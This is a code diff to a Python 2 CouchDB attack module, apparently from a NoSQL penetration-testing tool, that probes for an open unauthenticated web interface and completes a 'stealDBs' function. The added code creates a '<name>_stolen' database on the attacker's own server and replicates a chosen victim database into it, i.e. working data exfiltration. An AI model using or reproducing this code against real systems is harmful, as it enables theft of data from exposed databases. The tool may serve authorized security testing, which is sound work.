@@ -16,6 +16,7 @@
 
 
 import couchdb
+import urllib
 import requests
 import sys
 import string
@@ -112,7 +113,7 @@ def netAttacks(target,port, myIP):
         return
 
 	
-    mgtUrl = "http://" + target + ":5984/_utils"	
+    mgtUrl = "http://" + target + ":5984/"	
     #Future rev:  Add web management interface parsing
     try:
         mgtRespCode = urllib.urlopen(mgtUrl).getcode()
@@ -120,7 +121,7 @@ def netAttacks(target,port, myIP):
             print "Sofa web management open at " + mgtUrl + ".  No authentication required!"
 
     except:
-        print "MongoDB web management closed or requires authentication."
+        print "Sofa web management closed or requires authentication."
     
     if mgtOpen == True:
         while mgtSelect:
@@ -146,7 +147,7 @@ def netAttacks(target,port, myIP):
                 
             if attack == "4":
                     print "\n"
-                    stealDBs(myIP,conn)
+                    stealDBs(myIP,conn,target)
 
             if attack == "5":
                     return
@@ -198,7 +199,7 @@ def enumDbs (couchConn,target):
         
     return
 
-def stealDBs (myDB, couchConn):
+def stealDBs (myDB, couchConn, target):
     dbLoot = True
     menuItem = 1
     dbList = []
@@ -224,8 +225,9 @@ def stealDBs (myDB, couchConn):
             break
         
     try:
-        print dbList[int(dbLoot)-1] #debug
-        print "http://" + myDB + ":5984/" + dbList[int(dbLoot)-1] + "_stolen" #debug
+        #Create the DB target first
+        myServer = couchdb.Server("http://" + myDB + ":5984")
+        targetDB = myServer.create(dbList[int(dbLoot)-1] + "_stolen")
         couchConn.replicate(dbList[int(dbLoot)-1],"http://" + myDB + ":5984/" + dbList[int(dbLoot)-1] + "_stolen")
         
         cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
@@ -236,8 +238,7 @@ def stealDBs (myDB, couchConn):
         else:
             return
 
-    except Exception, e:
-        print e #Debug
+    except:
         raw_input ("Something went wrong.  Are you sure your CouchDB is running and options are set? Press enter to return...")
         return
     
